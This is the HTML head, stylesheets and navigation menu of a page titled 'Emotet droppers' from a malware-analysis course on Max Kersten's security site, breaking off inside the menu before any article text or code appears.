<!DOCTYPE html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<link rel="profile" href="https://gmpg.org/xfn/11">
	<title>Emotet droppers &#8211; Max Kersten</title>
<style type="text/css">
/**
 * GeSHi Dynamically Generated Stylesheet
 * --------------------------------------
 * Dynamically generated stylesheet for vb
 * CSS class: , CSS id: 
 * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2014 Benny Baumann
 * (http://qbnz.com/highlighter/ and http://geshi.org/)
 * --------------------------------------
 */
.vb .de1, .vb .de2 {}
.vb  {font-family:monospace;}
.vb .imp {font-weight: bold; color: red;}
.vb li, .vb .li1 {font-weight: normal; vertical-align:top;}
.vb .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
.vb .li2 {font-weight: bold; vertical-align:top;}
.vb .kw1 {color: #F660AB; font-weight: bold;}
.vb .kw2 {color: #E56717; font-weight: bold;}
.vb .kw3 {color: #8D38C9; font-weight: bold;}
.vb .kw4 {color: #151B8D; font-weight: bold;}
.vb .kw5 {color: #00C2FF; font-weight: bold;}
.vb .kw6 {color: #3EA99F; font-weight: bold;}
.vb .co1 {color: #008000;}
.vb .es0 {color: #800000; font-weight: bold;}
.vb .st0 {color: #800000;}
.vb .ln-xtra, .vb li.ln-xtra, .vb div.ln-xtra {background-color: #ffc;}
.vb span.xtra { display:block; }
/**
 * GeSHi Dynamically Generated Stylesheet
 * --------------------------------------
 * Dynamically generated stylesheet for powershell
 * CSS class: , CSS id: 
 * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2014 Benny Baumann
 * (http://qbnz.com/highlighter/ and http://geshi.org/)
 * --------------------------------------
 */
.powershell .de1, .powershell .de2 {}
.powershell  {font-family:monospace;}
.powershell .imp {font-weight: bold; color: red;}
.powershell li, .powershell .li1 {font-weight: normal; vertical-align:top;}
.powershell .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
.powershell .li2 {font-weight: bold; vertical-align:top;}
.powershell .kw1 {color: #008080; font-weight: bold;}
.powershell .kw2 {color: #008080; font-weight: bold;}
.powershell .kw3 {color: #0000FF;}
.powershell .kw4 {color: #FF0000;}
.powershell .kw5 {color: #008080; font-style: italic;}
.powershell .kw6 {color: #000080;}
.powershell .co1 {color: #008000;}
.powershell .coMULTI {color: #008000;}
.powershell .es0 {color: #008080; font-weight: bold;}
.powershell .br0 {color: #000000;}
.powershell .sy0 {color: pink;}
.powershell .st0 {color: #800000;}
.powershell .nu0 {color: #804000;}
.powershell .me0 {color: pink;}
.powershell .re0 {color: #800080;}
.powershell .re3 {color: #008080;}
.powershell .re4 {color: #008080;}
.powershell .re5 {color: #800000;}
.powershell .re6 {color: #000080;}
.powershell .ln-xtra, .powershell li.ln-xtra, .powershell div.ln-xtra {background-color: #ffc;}
.powershell span.xtra { display:block; }
/**
 * GeSHi Dynamically Generated Stylesheet
 * --------------------------------------
 * Dynamically generated stylesheet for php
 * CSS class: , CSS id: 
 * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2014 Benny Baumann
 * (http://qbnz.com/highlighter/ and http://geshi.org/)
 * --------------------------------------
 */
.php .de1, .php .de2 {}
.php  {font-family:monospace;}
.php .imp {font-weight: bold; color: red;}
.php li, .php .li1 {font-weight: normal; vertical-align:top;}
.php .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
.php .li2 {font-weight: bold; vertical-align:top;}
.php .kw1 {color: #b1b100;}
.php .kw2 {color: #000000; font-weight: bold;}
.php .kw3 {color: #990000;}
.php .kw4 {color: #009900; font-weight: bold;}
.php .co1 {color: #666666; font-style: italic;}
.php .co2 {color: #666666; font-style: italic;}
.php .co3 {color: #0000cc; font-style: italic;}
.php .co4 {color: #009933; font-style: italic;}
.php .coMULTI {color: #666666; font-style: italic;}
.php .es0 {color: #000099; font-weight: bold;}
.php .es1 {color: #000099; font-weight: bold;}
.php .es2 {color: #660099; font-weight: bold;}
.php .es3 {color: #660099; font-weight: bold;}
.php .es4 {color: #006699; font-weight: bold;}
.php .es5 {color: #006699; font-weight: bold; font-style: italic;}
.php .es6 {color: #009933; font-weight: bold;}
.php .es_h {color: #000099; font-weight: bold;}
.php .br0 {color: #009900;}
.php .sy0 {color: #339933;}
.php .sy1 {color: #000000; font-weight: bold;}
.php .st0 {color: #0000ff;}
.php .st_h {color: #0000ff;}
.php .nu0 {color: #cc66cc;}
.php .nu8 {color: #208080;}
.php .nu12 {color: #208080;}
.php .nu19 {color:#800080;}
.php .me1 {color: #004000;}
.php .me2 {color: #004000;}
.php .re0 {color: #000088;}
.php .ln-xtra, .php li.ln-xtra, .php div.ln-xtra {background-color: #ffc;}
.php span.xtra { display:block; }
/**
 * GeSHi Dynamically Generated Stylesheet
 * --------------------------------------
 * Dynamically generated stylesheet for c
 * CSS class: , CSS id: 
 * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2014 Benny Baumann
 * (http://qbnz.com/highlighter/ and http://geshi.org/)
 * --------------------------------------
 */
.c .de1, .c .de2 {}
.c  {font-family:monospace;}
.c .imp {font-weight: bold; color: red;}
.c li, .c .li1 {font-weight: normal; vertical-align:top;}
.c .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
.c .li2 {font-weight: bold; vertical-align:top;}
.c .kw1 {color: #b1b100;}
.c .kw2 {color: #000000; font-weight: bold;}
.c .kw3 {color: #000066;}
.c .kw4 {color: #993333;}
.c .co1 {color: #666666; font-style: italic;}
.c .co2 {color: #339933;}
.c .coMULTI {color: #808080; font-style: italic;}
.c .es0 {color: #000099; font-weight: bold;}
.c .es1 {color: #000099; font-weight: bold;}
.c .es2 {color: #660099; font-weight: bold;}
.c .es3 {color: #660099; font-weight: bold;}
.c .es4 {color: #660099; font-weight: bold;}
.c .es5 {color: #006699; font-weight: bold;}
.c .br0 {color: #009900;}
.c .sy0 {color: #339933;}
.c .st0 {color: #ff0000;}
.c .nu0 {color: #0000dd;}
.c .nu6 {color: #208080;}
.c .nu8 {color: #208080;}
.c .nu12 {color: #208080;}
.c .nu16 {color:#800080;}
.c .nu17 {color:#800080;}
.c .nu18 {color:#800080;}
.c .nu19 {color:#800080;}
.c .me1 {color: #202020;}
.c .me2 {color: #202020;}
.c .ln-xtra, .c li.ln-xtra, .c div.ln-xtra {background-color: #ffc;}
.c span.xtra { display:block; }
</style>
<meta name='robots' content='max-image-preview:large' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link href='https://fonts.gstatic.com' crossorigin rel='preconnect' />
<link rel="alternate" type="application/rss+xml" title="Max Kersten &raquo; Feed" href="https://maxkersten.nl/feed/" />
<link rel="alternate" type="application/rss+xml" title="Max Kersten &raquo; Comments Feed" href="https://maxkersten.nl/comments/feed/" />

<link rel='stylesheet' id='wp-block-library-css' href='https://maxkersten.nl/wp-includes/css/dist/block-library/style.min.css?ver=6.7.1' type='text/css' media='all' />
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='generate-style-grid-css' href='https://maxkersten.nl/wp-content/themes/generatepress/css/unsemantic-grid.min.css?ver=1.3.46' type='text/css' media='all' />
<link rel='stylesheet' id='generate-style-css' href='https://maxkersten.nl/wp-content/themes/generatepress/style.css?ver=1.3.46' type='text/css' media='all' />
<style id='generate-style-inline-css' type='text/css'>
body{background-color:#efefef;color:#3a3a3a;}a, a:visited{color:#1e73be;text-decoration:none;}a:hover, a:focus, a:active{color:#000000;text-decoration:none;}body .grid-container{max-width:1100px;}
body, button, input, select, textarea{font-family:"Open Sans", sans-serif;}.main-navigation .main-nav ul ul li a{font-size:14px;}@media (max-width:768px){.main-title{font-size:30px;}h1{font-size:30px;}h2{font-size:25px;}}
.site-header{background-color:#ffffff;color:#3a3a3a;}.site-header a,.site-header a:visited{color:#3a3a3a;}.main-title a,.main-title a:hover,.main-title a:visited{color:#222222;}.site-description{color:#999999;}.main-navigation,.main-navigation ul ul{background-color:#222222;}.main-navigation .main-nav ul li a,.menu-toggle{color:#ffffff;}.main-navigation .main-nav ul li > a:hover,.main-navigation .main-nav ul li > a:focus, .main-navigation .main-nav ul li.sfHover > a{color:#ffffff;background-color:#3f3f3f;}button.menu-toggle:hover,button.menu-toggle:focus,.main-navigation .mobile-bar-items a,.main-navigation .mobile-bar-items a:hover,.main-navigation .mobile-bar-items a:focus{color:#ffffff;}.main-navigation .main-nav ul li[class*="current-menu-"] > a{color:#ffffff;background-color:#3f3f3f;}.main-navigation .main-nav ul li[class*="current-menu-"] > a:hover,.main-navigation .main-nav ul li[class*="current-menu-"].sfHover > a{color:#ffffff;background-color:#3f3f3f;}.main-navigation ul ul{background-color:#3f3f3f;}.main-navigation .main-nav ul ul li a{color:#ffffff;}.main-navigation .main-nav ul ul li > a:hover,.main-navigation .main-nav ul ul li > a:focus,.main-navigation .main-nav ul ul li.sfHover > a{color:#ffffff;background-color:#4f4f4f;}.main-navigation .main-nav ul ul li[class*="current-menu-"] > a{color:#ffffff;background-color:#4f4f4f;}.main-navigation .main-nav ul ul li[class*="current-menu-"] > a:hover,.main-navigation .main-nav ul ul li[class*="current-menu-"].sfHover > a{color:#ffffff;background-color:#4f4f4f;}.separate-containers .inside-article, .separate-containers .comments-area, .separate-containers .page-header, .one-container .container, .separate-containers .paging-navigation, .inside-page-header{background-color:#ffffff;}.entry-meta{color:#888888;}.entry-meta a,.entry-meta a:visited{color:#666666;}.entry-meta a:hover{color:#1e73be;}.sidebar .widget{background-color:#ffffff;}.sidebar .widget .widget-title{color:#000000;}.site-info{color:#ffffff;background-color:#222222;}.site-info a,.site-info a:visited{color:#ffffff;}.site-info a:hover{color:#606060;}.footer-bar .widget_nav_menu .current-menu-item a{color:#606060;}input[type="text"],input[type="email"],input[type="url"],input[type="password"],input[type="search"],textarea{color:#666666;background-color:#fafafa;border-color:#cccccc;}input[type="text"]:focus,input[type="email"]:focus,input[type="url"]:focus,input[type="password"]:focus,input[type="search"]:focus,textarea:focus{color:#666666;background-color:#ffffff;border-color:#bfbfbf;}button,html input[type="button"],input[type="reset"],input[type="submit"],.button,.button:visited{color:#ffffff;background-color:#666666;}button:hover,html input[type="button"]:hover,input[type="reset"]:hover,input[type="submit"]:hover,.button:hover,button:focus,html input[type="button"]:focus,input[type="reset"]:focus,input[type="submit"]:focus,.button:focus{color:#ffffff;background-color:#3f3f3f;}
@media (max-width:768px){.separate-containers .inside-article, .separate-containers .comments-area, .separate-containers .page-header, .separate-containers .paging-navigation, .one-container .site-content, .inside-page-header{padding:30px;}}.main-navigation ul ul{top:auto;}
</style>
<link rel='stylesheet' id='generate-mobile-style-css' href='https://maxkersten.nl/wp-content/themes/generatepress/css/mobile.min.css?ver=1.3.46' type='text/css' media='all' />
<link rel='stylesheet' id='fontawesome-css' href='https://maxkersten.nl/wp-content/themes/generatepress/css/font-awesome.min.css?ver=4.7' type='text/css' media='all' />
<!--[if lt IE 9]>
<link rel='stylesheet' id='generate-ie-css' href='https://maxkersten.nl/wp-content/themes/generatepress/css/ie.min.css?ver=1.3.46' type='text/css' media='all' />
<![endif]-->
<link rel='stylesheet' id='wpgeshi-wp-geshi-highlight-css' href='https://maxkersten.nl/wp-content/plugins/wp-geshi-highlight/wp-geshi-highlight.css?ver=6.7.1' type='text/css' media='all' />
<script type="text/javascript" src="https://maxkersten.nl/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://maxkersten.nl/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<link rel="https://api.w.org/" href="https://maxkersten.nl/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://maxkersten.nl/wp-json/wp/v2/pages/1079" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://maxkersten.nl/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.7.1" />
<link rel="canonical" href="https://maxkersten.nl/binary-analysis-course/malware-analysis/emotet-droppers/" />
<link rel='shortlink' href='https://maxkersten.nl/?p=1079' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://maxkersten.nl/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fmaxkersten.nl%2Fbinary-analysis-course%2Fmalware-analysis%2Femotet-droppers%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://maxkersten.nl/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fmaxkersten.nl%2Fbinary-analysis-course%2Fmalware-analysis%2Femotet-droppers%2F&#038;format=xml" />
<meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="https://maxkersten.nl/wp-content/uploads/2021/03/cropped-libra-32x32.png" sizes="32x32" />
<link rel="icon" href="https://maxkersten.nl/wp-content/uploads/2021/03/cropped-libra-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://maxkersten.nl/wp-content/uploads/2021/03/cropped-libra-180x180.png" />
<meta name="msapplication-TileImage" content="https://maxkersten.nl/wp-content/uploads/2021/03/cropped-libra-270x270.png" />
</head>

<body data-rsssl=1 itemtype='http://schema.org/WebPage' itemscope='itemscope' class="page-template-default page page-id-1079 page-child parent-pageid-744  right-sidebar nav-below-header fluid-header separate-containers active-footer-widgets-0 nav-aligned-left header-aligned-left dropdown-hover">
	<a class="screen-reader-text skip-link" href="#content" title="Skip to content">Skip to content</a>
			<header itemtype="http://schema.org/WPHeader" itemscope="itemscope" id="masthead" class="site-header">
		<div class="inside-header grid-container grid-parent">
						<div class="site-branding">
				<p class="main-title" itemprop="headline">
			<a href="https://maxkersten.nl/" rel="home">
				Max Kersten
			</a>
		</p>
				<p class="site-description">
			Security through explanation
		</p>
			</div>					</div><!-- .inside-header -->
	</header><!-- #masthead -->
			<nav itemtype="http://schema.org/SiteNavigationElement" itemscope="itemscope" id="site-navigation" class="main-navigation">
		<div class="inside-navigation grid-container grid-parent">
						<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
								<span class="mobile-menu">Menu</span>
			</button>
				<div id="primary-menu" class="main-nav">
		<ul class="menu sf-menu">
			<li class="page_item page-item-31"><a href="https://maxkersten.nl/">Home</a></li>
<li class="page_item page-item-51"><a href="https://maxkersten.nl/blog/">Blog</a></li>
<li class="page_item page-item-205 menu-item-has-children current-menu-ancestor"><a href="https://maxkersten.nl/binary-analysis-course/">Binary Analysis Course<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
<ul class='children'>
<li class="page_item page-item-240 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/introduction/">Introduction<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-208"><a href="https://maxkersten.nl/binary-analysis-course/introduction/secura-grand-slam-ctf-easy-reverse/">Practical case: Secura Grand Slam CTF &#8220;Easy Reverse&#8221;</a></li>
<li class="page_item page-item-2135"><a href="https://maxkersten.nl/binary-analysis-course/introduction/the-workstation/">The workstation</a></li>
<li class="page_item page-item-263"><a href="https://maxkersten.nl/binary-analysis-course/introduction/basic-cpu-architecture/">Basic CPU architecture</a></li>
	</ul>
</li>
<li class="page_item page-item-311 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/">Assembly basics<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-313"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/conditions-and-loops/">Conditions and loops</a></li>
<li class="page_item page-item-400"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/practical-case-patch-me-0x01/">Practical case: Patch Me 0x01</a></li>
<li class="page_item page-item-485"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/methods-and-macros-the-call-stack/">Methods and macros: the call stack</a></li>
<li class="page_item page-item-529"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/practical-case-buffer-overflow-0x01/">Practical case: Buffer Overflow 0x01</a></li>
<li class="page_item page-item-568"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/crash-course/">Crash course</a></li>
<li class="page_item page-item-1569"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/practical-case-crack-me-0x01/">Practical case: Crack Me 0x01</a></li>
<li class="page_item page-item-1680"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/practical-case-crack-me-0x02/">Practical case: Crack Me 0x02</a></li>
<li class="page_item page-item-1971"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/practical-case-crack-me-0x03/">Practical case: Crack Me 0x03</a></li>
	</ul>
</li>
<li class="page_item page-item-1286 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/assembly-code/">Assembly code<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-1289"><a href="https://maxkersten.nl/binary-analysis-course/assembly-code/hello-world/">Hello world</a></li>
<li class="page_item page-item-1323"><a href="https://maxkersten.nl/binary-analysis-course/assembly-code/universal-product-code-calculator/">Universal Product Code calculator</a></li>
<li class="page_item page-item-1385"><a href="https://maxkersten.nl/binary-analysis-course/assembly-code/debugging-code/">Debugging code</a></li>
	</ul>
</li>
<li class="page_item page-item-610 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/binary-types/">Binary types<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-615"><a href="https://maxkersten.nl/binary-analysis-course/binary-types/dot-net/">Dot Net</a></li>
<li class="page_item page-item-687"><a href="https://maxkersten.nl/binary-analysis-course/binary-types/android/">Android</a></li>
<li class="page_item page-item-1541"><a href="https://maxkersten.nl/binary-analysis-course/binary-types/browser-plug-in/">Browser plug-in</a></li>
	</ul>
</li>
<li class="page_item page-item-1435 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/common-techniques/">Common techniques<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-1441"><a href="https://maxkersten.nl/binary-analysis-course/common-techniques/general-techniques/">General techniques</a></li>
<li class="page_item page-item-3155"><a href="https://maxkersten.nl/binary-analysis-course/common-techniques/analysing-scripts/">Analysing scripts</a></li>
<li class="page_item page-item-3439"><a href="https://maxkersten.nl/binary-analysis-course/common-techniques/debugging-dot-net-binaries/">Debugging Dot Net binaries</a></li>
	</ul>
</li>
<li class="page_item page-item-744 menu-item-has-children current-menu-ancestor current-menu-parent"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/">Malware analysis<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-4305"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/dot-net-rat/">Dot Net RAT</a></li>
<li class="page_item page-item-862"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/android-sms-stealer/">Android SMS Stealer</a></li>
<li class="page_item page-item-1039"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/lnk-isesteroids-powershell-dropper/">LNK &#038; ISESteroids Powershell dropper</a></li>
<li class="page_item page-item-1079 current-menu-item"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/emotet-droppers/">Emotet droppers</a></li>
<li class="page_item page-item-1193"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/magecart/">Magecart</a></li>
<li class="page_item page-item-1785"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/corona-ddos-bot/">Corona DDoS bot</a></li>
<li class="page_item page-item-2326"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/azorult-loader-stages/">Azorult loader stages</a></li>
<li class="page_item page-item-2472"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/emotet-javascript-downloader/">Emotet JavaScript downloader</a></li>
<li class="page_item page-item-2560"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/corona-locker/">Corona Locker</a></li>
<li class="page_item page-item-3016"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/rezer0v4-loader/">ReZer0v4 loader</a></li>
<li class="page_item page-item-3913"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/dumping-whispergates-wiper-from-an-eazfuscator-obfuscated-loader/">Dumping WhisperGate&#8217;s wiper from an Eazfuscator obfuscated loader</a></li>
	</ul>
</li>
<li class="page_item page-item-2046 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/analysis-scripts/">Analysis scripts<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
